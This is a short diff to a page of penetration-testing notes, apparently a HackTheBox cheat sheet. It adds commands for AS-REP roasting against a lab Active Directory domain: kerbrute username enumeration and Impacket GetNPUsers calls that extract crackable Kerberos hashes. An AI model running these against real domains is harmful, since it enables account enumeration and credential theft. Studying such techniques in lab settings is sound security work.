@@ -179,6 +179,13 @@
 <li><a href="https://github.com/GhostPack/Rubeus">GitHub Rubeus</a></li>
 </ul>
 <h3 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h3>
+<h3 id="check-for-valid-usernames"><a class="header" href="#check-for-valid-usernames">Check for valid usernames</a></h3>
+<pre><code>/opt/kerbrute userenum --dc $ip -d intelligence.htb users
+
+then do this
+
+GetNPUsers.py -no-pass -dc-ip $ip intelligence.htb/Jose.Williams
+</code></pre>
 <pre><code>impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
 
 or this:
